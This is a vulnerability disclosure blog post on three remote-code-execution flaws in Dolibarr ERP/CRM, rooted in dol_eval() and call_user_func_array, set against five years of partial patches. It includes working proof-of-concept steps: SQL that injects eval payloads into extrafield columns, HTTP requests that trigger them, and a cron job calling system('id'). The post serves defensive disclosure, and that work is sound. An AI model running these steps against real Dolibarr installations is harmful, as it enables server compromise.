---
layout: post
title: "Dolibarr dol_eval(): Five Years of Partial Patches"
date: 2026-05-25 00:00:00 -0500
categories: [disclosure]
tags: [dolibarr, cve, rce, dol_eval, code-injection]
author: "Bryam Vargas"
description: "Three remote-code-execution CVEs in Dolibarr ERP/CRM rooted in dol_eval() and call_user_func_array(), and the five-year pattern of partial patches that left the primitive reachable."
cves:
  - CVE-2026-37711
  - CVE-2026-37712
  - CVE-2026-37713
cvss:
  - 9.1
  - 9.1
  - 8.1
cwe:
  - CWE-94
  - CWE-78
  - CWE-95
affected: "Dolibarr v22.0.0 – v22.0.4 · v24.0.0-alpha"
vendor_response: "Advisories closed without technical refutation; reporter blacklisted"
---

## Abstract

This post documents three Remote Code Execution vulnerabilities in Dolibarr ERP/CRM, assigned **CVE-2026-37711**, **CVE-2026-37712**, and **CVE-2026-37713** by the MITRE TL-Root on April 10, 2026. The first finding is a `dol_eval()` code-injection pattern copied unchanged into 31 call sites across 30 files by a single 2025 commit, none of them individually patched since. Together with two additional findings — an unrestricted `call_user_func_array` in the cron scheduler and a passively-triggered `dol_eval` chain in the base business object class — these vulnerabilities affect all stable releases (v22.0.0 through v22.0.4) and the development branch (v24.0.0-alpha).

The wider context is a five-year pattern of `dol_eval`-related CVEs in Dolibarr (2022–2026), each addressed through blacklist expansion rather than architectural change. This post documents the three new findings, the audit methodology, and the broader pattern.

---

## 1. Background

### 1.1 The `dol_eval()` function

`dol_eval()` is a centralized wrapper around PHP's native `eval()` used throughout the Dolibarr codebase to evaluate dynamic expressions for computed extrafields, dynamic visibility rules, menu permissions, and access rights. Rather than eliminating `eval()` usage — as PHP's own documentation [recommends](https://www.php.net/manual/en/function.eval.php) — Dolibarr's approach has historically relied on a blacklist of forbidden functions and characters, expanded incrementally each time a bypass is discovered.

### 1.2 Five years of `dol_eval` CVEs

| Year | CVE | Bypass Vector | Fix Approach |
|---|---|---|---|
| 2022 | CVE-2022-0819 | `dol_eval` code injection (huntr.dev), affecting releases before 15.0.1 | Blacklist additions; fixed in 15.0.1 |
| 2022 | CVE-2022-40871 | Eval injection — a database-stored payload executed by `eval`; an administrator is addable via the install page (≤ 15.0.3) | Blacklist additions |
| 2024 | CVE-2024-40137 | Blacklist bypass via additional functions (computed field, Users Module Setup) | Blacklist expansion |
| 2025 | CVE-2025-56588 | Callable-accepting helpers (`array_map`, etc.) on the `extrafields.perms` attribute | Central `dol_eval()` blacklist expansion (commit `b03f30c7e`); introduced `dol_eval_standard()` |
| 2026 | CVE-2026-22666 | `dol_eval_standard()` whitelist-mode bypass via dynamic callable syntax `('exec')('id')` (Jiva Security; CNA: VulnCheck) | Fixed in 23.0.2 (commit `6f42552`) |
| **2026** | **CVE-2026-37711** | 31 unpatched `perms` call sites of the same pattern | unfixed |
| **2026** | **CVE-2026-37713** | Permissive-mode (`'2'`) eval on computed fields | unfixed |

The pattern is consistent: each finding is treated as a discrete bug rather than as a symptom of an architectural decision. The blacklist grows; the underlying use of `eval()` does not change.

### 1.3 Project philosophy

The Dolibarr `README.md` describes the design principle as *"Code that is easy to understand, maintain and develop (PHP with no heavy framework; trigger and hook architecture)."* The project explicitly forbids Composer dependencies, framework adoption, and database-side stored procedures. The maintainer has [defended](https://github.com/Dolibarr/dolibarr/pull/33082#issuecomment-2657456832) `GETPOST()` (the centralized input sanitization layer) as *"the main and the most important security layer of Dolibarr."*

This philosophy delivers genuine accessibility — Dolibarr is used by an estimated 600,000 installations and has remained installable on shared hosting since 2003 — but the same philosophy constrains the available responses to recurring vulnerability classes.

### 1.4 Prior community feedback

In February 2025, contributor `c3do` submitted [PR #33082](https://github.com/Dolibarr/dolibarr/pull/33082), a substantial rewrite of `dol_eval`. The stated rationale: *"I do not understand the idea of using 'eval' everywhere in Dolibarr when even the PHP documentation advises against its use. [...] Everywhere else, eval is not the right answer."*

During the review, `c3do` made a specific technical observation about the limits of the existing filter:

> "I added a filter that allows you to prohibit specific sequences of tokens. Which allows you to prohibit variable functions such as: `$a(); 'a'(); "a"();` It is necessary to prohibit them because they are not filtered by the function name filter."

That is — fourteen months before CVE-2026-22666 was assigned — an explicit description of the exact bypass class that CVE would later use: a function call expressed through a string literal (`'a'()`), which a name-based filter does not inspect. A fix for it was proposed in the same PR.

PR #33082 was not merged. The maintainers' counter-proposal was a parallel implementation gated behind a configuration constant (`MAIN_USE_NEW_DOL_EVAL`) — an opt-in transition rather than an architectural replacement — and the PR was ultimately closed without merge.

### 1.5 The transition to `dol_eval_standard()`

The CVE-2025-56588 patch did more than expand the central blacklist: it also introduced `dol_eval_standard()` — a second evaluation wrapper with a whitelist mode, gated by the `$dolibarr_main_restrict_eval_methods` configuration variable. Six months later, Farhan Jiva (Jiva Security) demonstrated a bypass of that whitelist, assigned **CVE-2026-22666** (CNA: VulnCheck) and fixed in Dolibarr 23.0.2 (commit `6f42552`).

The stable 22.x branch, however, never adopted the new wrapper at the 31 `perms` call sites enumerated in this disclosure. The result is three branches carrying three different gaps at once: 22.x retains the original blacklist, 23.x carries the bypassed whitelist, and `develop` inherits both. Patch incompleteness compounded with patch bypass — both within a six-month window.

---

## 2. Methodology

### 2.1 Approach

This research was conducted source-first: reading the Dolibarr codebase, tracing data flows from input sources to sink calls, reproducing each finding in an isolated lab, and documenting reproducible steps.

### 2.2 Tooling

Vulnerability identification used `grep -rn` to enumerate `dol_eval(` and `call_user_func_array(` call sites across the `htdocs/` tree, followed by per-call-site manual review of:

1. **Input source** — `GETPOST()` parameters, database-stored content, configuration values.
2. **Sanitization layer** — what filter, if any, is applied before the call (`'aZ09'`, `'alpha'`, `'restricthtml'`, etc.).
3. **Reachability** — whether an authenticated user (or unauthenticated, where applicable) can cause the value to be evaluated.

For findings derived from amplifier files (e.g., `actions_addupdatedelete.inc.php`, included by 126 files), the inverse trace was performed: locating every consumer of the include and verifying that the vulnerable code path is reachable in each context.

### 2.3 Lab environment

All findings were reproduced on:

- Dolibarr 24.0.0-alpha (commit `ff146c4713`, the latest develop branch as of February 2026)
- Also confirmed on stable v22.0.0 through v22.0.4
- Podman containers on Ubuntu 24.04
- PHP 8.3.6, Apache 2.4.58, MariaDB 11.4
- Burp Suite for HTTP capture

Container isolation ensured that no test touched any production system. Network-isolated for fuzzing where applicable.

### 2.4 Methodology transparency

This statement is made deliberately. In the era of AI-driven vulnerability discovery — where models can produce voluminous reports of varying quality — distinguishing rigorous human research from automated output requires methodology transparency.

- **Vulnerability identification was human-driven.** No LLM was used to find the call sites, classify their reachability, or determine exploitability.
- **AI assistance was limited to documentation drafting** — wording, formatting, organization of timelines — and is disclosed here.
- **Per-finding audit trails are available on request:** `grep` output, per-site taintability notes, lab reproduction logs.

### 2.5 Curation

From a wider set of candidate findings produced during the audit, three were selected for coordinated disclosure based on:

- Severity (CVSS ≥ 8.0)
- Independent reproducibility
- Architectural significance — each represents a distinct sink class (`dol_eval` active, `dol_eval` passive, `call_user_func_array`)

---

## 3. Findings

### 3.1 CVE-2026-37711 — `dol_eval()` Code Injection via extrafields `perms` (CVSS 9.1)

**Class:** CWE-94 (Code Injection) + CWE-184 (Incomplete List of Disallowed Inputs)
**Affected:** Dolibarr v22.0.0 – v22.0.4 and v24.0.0-alpha
**GHSA:** `GHSA-grw9-6m4w-mhcq` *(closed by upstream maintainer; mirror filing pending on reporter's fork)*

#### Description

Dolibarr evaluates the `perms` attribute of extrafields using `dol_eval()` on every object update operation. The `attribute` parameter is read from user input via `GETPOST('attribute', 'aZ09')` and used to index `$extrafields->attributes[...]['perms'][...]` from the database. An administrator can store a PHP expression in `llx_extrafields.perms` and trigger its evaluation via `action=update_extras&attribute=<fieldname>`.

This vulnerability exists in **31 call sites across 30 files**, all introduced in commit `ae59c409f6` on March 26, 2025 (commit message: *"Modulebuilderization"*), and no individual call site has been patched since. CVE-2025-56588 (2025) hardened `dol_eval()` *centrally* — its patch, commit `b03f30c7e`, added callable-accepting helpers such as `array_map` to the `$forbiddenphpfunctions` blacklist inside `dol_eval()` — but a central blacklist change removes no call sites: the blacklist remains bypassable, and every one of these 31 sites stays reachable.

#### Vulnerable code

`htdocs/core/actions_addupdatedelete.inc.php`, line 430:

```php
$permissiontoeditextra = $permissiontoadd;
if (GETPOST('attribute', 'aZ09') && isset($extrafields->attributes
    [$object->table_element]['perms'][GETPOST('attribute', 'aZ09')])) {
    $permissiontoeditextra = dol_eval(
        (string) $extrafields->attributes[$object->table_element]['perms'][GETPOST('attribute', 'aZ09')]
    );
}
```

#### Systemic amplifier

`actions_addupdatedelete.inc.php` is included by 126 files across the codebase. Every module using this include inherits the vulnerability. The full inventory of 31 affected sites is enumerated in the GHSA advisory.

#### Proof of Concept

```sql
-- Step 1: Inject payload (requires admin)
UPDATE llx_extrafields
SET perms = 'die("C4_CONFIRMED_RCE")'
WHERE name = 'evil_field' AND elementtype = 'societe';
```

```http
POST /societe/card.php HTTP/1.1
Host: target
Cookie: DOLSESSID_...=<valid_session>

action=update_extras&id=1&attribute=evil_field&token=<csrf_token>
```

**Confirmed result** (Burp Suite, 2026-03-02, commit `ff146c4713`):

```http
HTTP/1.1 200 OK
Content-Length: 16
Content-Type: text/html; charset=UTF-8

C4_CONFIRMED_RCE
```

The full page response (normally ~60KB) was reduced to 16 bytes — `die()` executed and terminated PHP execution. Code injection confirmed.

The blacklist blocks direct calls to `system()`, `exec()`, etc., but `die()` is not blocked, demonstrating that the `eval()` call itself is fully reachable. Combined with less-restricted `dol_eval()` call sites (see §3.3), the chain achieves OS command execution.

#### Recommended fix

Remove the `dol_eval` block entirely from this code path. The `perms` attribute should be evaluated server-side against a fixed grammar, not via `eval()`.

---

### 3.2 CVE-2026-37712 — Authenticated RCE via `call_user_func_array` in Cron Jobs (CVSS 9.1)

**Class:** CWE-78 (OS Command Injection)
**Affected:** Dolibarr v22.0.0 – v22.0.4 and v24.0.0-alpha
**GHSA:** `GHSA-c2jp-w9cj-6cx4` *(closed by upstream maintainer; mirror filing pending on reporter's fork)*

#### Description

Dolibarr's scheduled job system supports two job types: `command` and `function`. The `command` type is intentionally protected by the configuration flag `$dolibarr_cron_allow_cli`. The `function` type passes user-controlled input directly to PHP's `call_user_func_array()` with no allowlist, no blacklist, and no validation of the method name.

An administrator can create a job with `methodename='system'` and `params='id'` entirely through the web UI — no database access, no `conf.php` modification, and no `$dolibarr_cron_allow_cli` requirement.

#### Vulnerable code

`htdocs/cron/class/cronjob.class.php`, lines ~1448–1490:

```php
if ($this->jobtype == 'function') {
    $libpath = '/'.strtolower($this->module_name).'/lib/'.$this->libname;
    $ret = dol_include_once($libpath);
    if ($ret === false) {
        $error++; // blocks only if file doesn't exist
    }
    if (!$error) {
        $params_arr = array_map('trim', explode(",", $this->params));
        // NO ALLOWLIST CHECK — methodename comes directly from DB
        $result = call_user_func_array($this->methodename, $params_arr);
    }
}
```

For comparison, the `method` job type (line 1380) explicitly blocks at least one dangerous case:

```php
if (in_array(strtolower(trim($this->methodename)), array('executecli'))) {
    $error++; // blocked
}
```

The `function` type has no equivalent guard.

#### Proof of Concept

Create a job entirely from the web UI (Setup → Scheduled Jobs → New Job):

| Field | Value |
|---|---|
| Job type | Function (PHP) |
| Module | `zapier` |
| Filename with class | `zapier.lib.php` |
| Method | `system` |
| Parameters | `id` |

Notes on input filtering:
- `methodename` is read via `GETPOST('methodename', 'aZ09')` — alphanumeric filter accepts `system`, `exec`, `passthru`.
- `params` is read via `GETPOST('params')` — no filter.

The library `zapier.lib.php` exists in a default Dolibarr installation; any installed module library passes the `dol_include_once()` check (e.g. `paypal/lib/paypal.lib.php`, `recruitment/lib/...`).

Trigger via:

```http
GET /cron/card.php?id={JOB_ID}&action=confirm_execute&confirm=yes&token=...
```

**Confirmed output** in HTTP response:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The output of `system()` is printed directly into PHP's output buffer and appears at the top of the HTML response, before template rendering.

#### Recommended fix

Implement a strict allowlist for `$this->methodename` when `jobtype == 'function'`, restricting it to Dolibarr-defined functions only. Alternatively, enforce that the called method belongs to an explicitly instantiated Dolibarr class rather than allowing raw global PHP function execution.

---

### 3.3 CVE-2026-37713 — `dol_eval()` PHP Code Execution via Computed Extrafield, Passive Trigger (CVSS 8.1)

**Class:** CWE-95 (Eval Injection)
**Affected:** Dolibarr v22.0.0 – v22.0.4 (default install). v24.0-alpha is reachable **only** when `$dolibarr_main_restrict_eval_methods` is manually emptied in `conf.php` — see per-branch table below.
**GHSA:** `GHSA-cq92-jp5j-rwvj` *(closed by upstream maintainer; mirror filing pending on reporter's fork)*

#### Description

Dolibarr evaluates the `fieldcomputed` property of extrafields using `dol_eval()` with `onlysimplestring='2'` (permissive mode) on **every object fetch, insert, update, and display**. An administrator can inject a PHP expression into `llx_extrafields.fieldcomputed` via the extrafield admin UI. Any subsequently authenticated request that loads, creates, or updates a business object of the affected type routes the stored string through `dol_eval_standard()` and into PHP's native `eval()`.

The function's filter pipeline (char-whitelist + dynamic-call regex + deny-list of ~70 dangerous function/class names) prevents direct OS command execution — `system`, `exec`, `passthru`, `shell_exec`, `proc_open`, `popen`, `eval`, `assert`, `create_function`, `mb_ereg_replace`, all callable-accepting helpers (`array_map`, `call_user_func`, `preg_replace_callback`, …), all file ops (`fopen`, `file_put_contents`, `unlink`, `mkdir`, …) are all explicitly denied — but does **not** cover the broader PHP API. Reachable from inside the filter: `phpversion()`, `phpinfo()`, `header()`, `setcookie()`, `define()`, the `socket_*` / `stream_socket_*` families, `unserialize()`, plus method calls on the in-scope `$db`, `$conf`, `$user`, `$mysoc`, `$objectoffield` globals.

OS command execution requires a separate primitive. Chain this with CVE-2026-37712 (§3.2), which provides clean OS-command execution via `call_user_func_array` in the cron scheduler.

The payload executes automatically on any authenticated page load. **No specific action is required from the victim.**

#### Per-branch reachability

| Branch | Default `dol_eval` mode | Default install affected? |
|---|---|---|
| **v22.0.0 – v22.0.4** | blacklist (always) | **YES** |
| v23.0.0 – v23.0.1 | whitelist (pre-22666-fix) | only with CVE-2026-22666 bypass |
| v23.0.2 – v23.x | whitelist (post-22666) | NO (no public bypass known) |
| **v24.0-alpha (develop)** | whitelist | NO — only if operator empties `$dolibarr_main_restrict_eval_methods` |

#### Vulnerable code

`htdocs/core/class/commonobject.class.php`, line **6654** (v22.0.4 release tag; the sink also appears at lines 6783, 7232, 8549 for other code paths):

```php
$this->array_options['options_' . $key] = dol_eval(
    (string) $extrafields->attributes[$this->table_element]['computed'][$key],
    1, 0, '2'
);
```

`dol_eval()` dispatches to `dol_eval_standard()` by default. The `eval()` is performed inside `dol_eval_standard()` as:

```php
$tmps = $hideerrors ? @eval('return ' . $s . ';') : eval('return ' . $s . ';');
```

The block runs inside `fetch_optionals()`, `insertExtraFields()`, `updateExtraField()`, and `showOptionals()`. Because `commonobject.class.php` is the base class for all Dolibarr business objects (invoices, orders, contacts, products, projects, tickets, etc.), the attack surface spans the entire application.

#### Affected instances

| File | Line (v22.0.4) | Trigger |
|---|---|---|
| `core/class/commonobject.class.php` | 6654 | Any `fetch_optionals()` |
| `core/class/commonobject.class.php` | 6783 | Any `insertExtraFields()` |
| `core/class/commonobject.class.php` | 7232 | Any `updateExtraField()` |
| `core/class/commonobject.class.php` | 8549 | Any `showOptionals()` |
| `compta/facture/class/facture.class.php` | 2422 | Any invoice fetch |
| `compta/facture/class/facture.class.php` | 2645 | Any invoice line fetch |
| `compta/facture/class/factureligne.class.php` | 366 | Any invoice line fetch |
| `core/tpl/extrafields_list_print_fields.tpl.php` | 78 | Any list page |
| `webportal/class/html.formwebportal.class.php` | 856 | Webportal (potentially unauthenticated) |

#### Proof of concept

**Step 1 — Filter verification.** Running v22.0.4 `dol_eval_standard()` directly against candidate payloads:

```
[A] system("id")                 ❌ REJECTED
    → "Bad string syntax to evaluate: __forbiddenstring__("id")"
[B] phpversion()                 ✅ PASSED — RETURN: "8.3.31"
[C] define("PWN", phpversion())  ✅ PASSED — RETURN: true
```

Payload [A] is rejected at the function-name deny-list (`\bsystem\b` matches and substitutes `__forbiddenstring__`). Payload [B] — a filter-passing call to `phpversion()` — passes and returns the host's actual PHP version string.

**Step 2 — Inject the filter-passing payload** into `llx_extrafields.fieldcomputed` via admin UI (Setup → Extrafields → Computed value) or direct SQL:

```sql
UPDATE llx_extrafields
SET fieldcomputed = 'phpversion()'
WHERE name = 'rce_test' AND elementtype = 'societe';
```

**Step 3 — End-to-end lab reproduction.** Environment: Dolibarr **v22.0.4** (`DOL_VERSION` constant verified), PHP **8.3.31** (Ondrej Sury build for Debian trixie), Apache **2.4.67**, MariaDB **11.8.6**, on Debian 13.5. `Societe::fetch_optionals(1)` is invoked, which iterates `$extrafields->attributes['societe']['computed']` and calls `dol_eval(...)` for each entry — the documented sink call from `commonobject.class.php:6654`.

**Self-evidencing capture** — the rendered HTML row for the `RCE Test Field` extrafield (output of `showOptionals()`, which is what `/societe/card.php?id=1` renders in the field's data row):

```html
<tr id="extrarow-societe_rce_test_1"
    class="field_options_rce_test societe_extras_rce_test trextrafields_collapse_1"
    data-element="extrafield" data-targetelement="societe" data-targetid="1">
  <td class="titlefieldmax45 wordbreak">RCE Test Field</td>
  <td id="societe_extras_rce_test_1"
      class="valuefieldcreate societe_extras_rce_test">8.3.31</td>
</tr>
```

The text `8.3.31` inside the `<td class="valuefieldcreate societe_extras_rce_test">` cell is the **only** slot in the Dolibarr render template that can hold the dol_eval return value — the field's computed result. The value `8.3.31` matches the host's actual PHP version (`PHP 8.3.31 (cli)`), proving that `eval('return phpversion();')` ran inside `dol_eval_standard()` and the result reached the rendered HTML body. The same value is also present in `$societe->array_options['options_rce_test']` during the request, where `fetch_optionals()` writes it.

The Dolibarr authentication wrapper is the trigger precondition — any authenticated user reaching any `Societe` card page suffices to invoke `Societe::fetch_optionals()` — and is not part of the bug itself. The lab harness exercises the eval injection directly via the documented sink call to keep the proof of the filter bypass + eval execution chain unambiguous.

#### Recommended fix

Replace `dol_eval()` for computed fields with a constrained, purpose-built expression evaluator that does not call PHP `eval()`. If the design constraint is to allow only arithmetic and string operations on object fields, a small dedicated parser (or an AST-based library such as `symfony/expression-language`) is appropriate; `eval()` plus a function-name deny-list cannot be made safe for user-influenced input.

---

## 4. Patch completeness analysis

CVE-2025-56588 was disclosed and patched in 2025. Its patch — commit `b03f30c7e`, *"Sec: Remove functions accepting callable params"* — added callable-accepting helpers such as `array_map`, `array_filter`, and `preg_replace_callback` to the central `$forbiddenphpfunctions` blacklist inside `dol_eval()`, in `core/lib/functions.lib.php`; its only other changes were two `install/upgrade` migration scripts and a `phpunit` test. It was a **central blacklist expansion** — it modified **no individual `dol_eval`-on-`perms` call site**.

The audit conducted for this disclosure identified **31** such call sites across 30 files, all introduced in a single commit on March 26, 2025 (`ae59c409f6`, *"Modulebuilderization"*). Because the 2025 fix changed only the central blacklist, **every one of those 31 sites remained reachable after it** — and the blacklist that fix expanded was itself bypassed eight months later, in CVE-2026-22666.

This is the structural problem, and it is not a defect of the 2025 patch in isolation. A blacklist-expansion response cannot converge on a fix: it removes no `eval()` sinks — every call site stays exactly where it was — and a deny-list of *"dangerous"* function names is, by construction, never complete, so each bypass is met only by appending another name. The same shape holds across the prior `dol_eval` CVEs of 2022 and 2024: the list grew; the `eval()`-based architecture did not change.

This finding is the principal architectural observation of this disclosure. The individual CVEs are real and reproducible, but the more durable problem is that the project's response model — blacklist expansion, with the `eval()` call sites left in place — does not converge on a fix. Each CVE patches a symptom; the next CVE finds a new path through the same architecture.

### Independent corroboration

This conclusion is not unique to the present disclosure. In April 2026, Farhan Jiva (Jiva Security) published an independent analysis of **CVE-2026-22666** — a whitelist-mode bypass of `dol_eval_standard()`, reached from Dolibarr 23.0.0 through a different entry point — and arrived at the same architectural assessment:

> "`eval()` is fundamentally the wrong primitive for user-defined expressions, no matter how many checks you wrap around it."
>
> — Farhan Jiva, *Breaking the Eval Cage* (CVE-2026-22666 disclosure, April 2026)

In the variant-analysis section of that write-up, Jiva independently enumerated `commonobject.class.php`, `facture.class.php`, and `html.formwebportal.class.php` as `dol_eval()` evaluation sinks — the same files identified in CVE-2026-37713 (§3.3), reached from a different version and a different bypass. Two researchers, working separately, converged on the same attack surface and the same root cause. That convergence is itself evidence that the problem is architectural rather than incidental.

---

## 5. Disclosure timeline

The record below is factual; commentary is reserved. Dates are 2026 unless noted.

| Date | Event |
|---|---|
| 2025-03-26 | Commit `ae59c409f6` ("Modulebuilderization") introduces the 31 `perms` call sites and the computed-field passive trigger. Author: ldestailleur. |
| 2025-07-27 | CVE-2025-56588 patched (commit `b03f30c7e`): a central `dol_eval()` blacklist expansion. None of the 31 `perms` call sites is modified. |
| 2026-02-24 | First contact with the Dolibarr maintainer — a consolidated GitHub Security Advisory covering the findings. 90-day disclosure timeline initiated. |
| 2026-02-28 – 03-02 | Lab reproduction and PoC confirmation on commit `ff146c4713`. |
| 2026-03-02 – 03-08 | The maintainer replies that the consolidated advisory "mixes several reports" and asks for one advisory per issue. The findings are re-submitted accordingly as three individual GitHub Security Advisories — one vulnerability per advisory, with Burp Suite captures, exact file/line references, and step-by-step PoCs. |
| 2026-03-10 | The maintainer closes all three advisories with an identical message — *"Due to a high level of non valid report reported by this user, all reports from this users are blacklisted."* — and no technical refutation. The researcher escalates the same day to the GitHub Security Advisory Database (request #137155). |
| 2026-03-13 | GitHub Security Advisory Database (Shelby Cunningham, Security Researcher III) declines CVE assignment, citing: *"Without the maintainer initiating CVE requests, GitHub can't issue CVEs."* The researcher is referred to MITRE Primary. |
| 2026-04-10 | MITRE Primary assigns CVE-2026-37711, CVE-2026-37712, and CVE-2026-37713, with full technical descriptions provided by the researcher. |
| **2026-05-25** | **Public disclosure (this post) — 90 days from first contact.** |

This is the timeline as it occurred. The maintainer's closure notice is reproduced verbatim because it is the only public record of the basis for closure. No technical refutation of the three findings has been provided publicly.

---

## 6. Recommendations

### 6.1 For Dolibarr

The findings in this post are individually fixable. The pattern that produced them is not, while the underlying architecture remains.

**Short-term (per-CVE fixes):**
- CVE-2026-37711: remove the `dol_eval` block from `actions_addupdatedelete.inc.php` and the 30 sites that include it. The `perms` attribute should not be evaluated as PHP.
- CVE-2026-37712: implement an allowlist of permitted method names for `jobtype='function'`, or require that the call target be a method of an explicitly instantiated Dolibarr class.
- CVE-2026-37713: replace `dol_eval()` for computed fields with a constrained, purpose-built expression evaluator.

**Architectural:**
- Adopt a parsing-based evaluator for computed expressions. PHP's `eval()` is an inappropriate primitive for user-supplied (or admin-supplied, attacker-pivotable) content, and the documentation [says so explicitly](https://www.php.net/manual/en/function.eval.php).
- When a CVE is reported in any function, perform a project-wide search for all call sites of that function — not only the one in the report — before declaring the CVE patched.
- Reconsider PR #33082 (or an equivalent rewrite). The proposal to eliminate `eval()`-based evaluation in favor of safe primitives is, in retrospect, the architectural fix that would have prevented this entire CVE family.

### 6.2 For downstream users

While patches are pending:

- Restrict administrator accounts to trusted personnel. All three vulnerabilities require administrator privileges to inject the payload, but the payload can persist and trigger on **any** authenticated user thereafter.
- Audit `llx_extrafields.perms` and `llx_extrafields.fieldcomputed` for unexpected PHP-like content.
- Audit `llx_cronjob` rows where `jobtype = 'function'` for unexpected `methodename` values (e.g., `system`, `exec`, `passthru`, `shell_exec`).
- Where feasible, run Apache as a non-`root` user. CVE-2026-37713 in particular escalates to system compromise when the web server runs as `root`.

---

## 7. References

- `GHSA-grw9-6m4w-mhcq` — CVE-2026-37711 *(reporter-side mirror filing pending; upstream GHSA closed without technical refutation)*
- `GHSA-c2jp-w9cj-6cx4` — CVE-2026-37712 *(reporter-side mirror filing pending; upstream GHSA closed without technical refutation)*
- `GHSA-cq92-jp5j-rwvj` — CVE-2026-37713 *(reporter-side mirror filing pending; upstream GHSA closed without technical refutation)*
- CVE-2025-56588 — 2025 `dol_eval` hardening: central `$forbiddenphpfunctions` blacklist expansion (commit `b03f30c7e`)
- CVE-2026-22666 — Jiva Security, *Breaking the Eval Cage* (April 2026) — independent `dol_eval_standard()` whitelist-bypass analysis (CNA: VulnCheck; fixed in 23.0.2)
- CVE-2025-67486 — Abduxalilov (April 2026) — independent extrafield `dol_eval()` injection; pins central `dol_eval_*` helpers with an active user-creation trigger. **Distinct from CVE-2026-37713**: that record pins four `commonobject.class.php` consumer sinks reached through a passive extrafield render. Listed for completeness; the two records cover non-overlapping reachability surfaces of the same dynamic-evaluation primitive.
- [Dolibarr PR #33082](https://github.com/Dolibarr/dolibarr/pull/33082) — c3do's `dol_eval` rewrite proposal (closed unmerged, Feb 2025)
- [PHP `eval()` documentation](https://www.php.net/manual/en/function.eval.php) — *"The eval() language construct is very dangerous because it allows execution of arbitrary PHP code. Its use thus is discouraged."*
- CVE-2022-0819, CVE-2022-40871, CVE-2024-40137 — prior `dol_eval`-related disclosures
- [Bishop Fox advisory on Dolibarr 9.0.1 (2019)](https://bishopfox.com/blog/2019-bishop-fox-disclosures) — earlier context on disclosure response patterns

---

## Appendix A — Lab environment

| Component | Version |
|---|---|
| Dolibarr | 24.0.0-alpha (commit `ff146c4713`); also confirmed on v22.0.0 – v22.0.4 |
| OS | Ubuntu 24.04 (containerized via Podman) |
| PHP | 8.3.6 |
| Web server | Apache 2.4.58 |
| Database | MariaDB 11.4 |
| HTTP capture | Burp Suite Professional |

## Appendix B — Per-finding audit material

Available on request. Includes:

- `grep` output enumerating all `dol_eval` and `call_user_func_array` call sites
- Per-site taintability analysis (input → sanitization → sink)
- Lab reproduction logs with timestamps
- HTTP capture archives (Burp `.saved` files)

## Acknowledgments

This work was conducted independently. Thanks to the MITRE TL-Root team for the CVE assignment process, to the OpenSSF Vulnerability Disclosures Working Group for the public guidance on coordinated disclosure, and to the Linux kernel `linux-wireless` community for unrelated mentorship in source-level review practice.

---

*Bryam Vargas — Bogotá, Colombia — May 2026*
*Contact: bryamestebanvargas [at] gmail.com — PGP key on request*
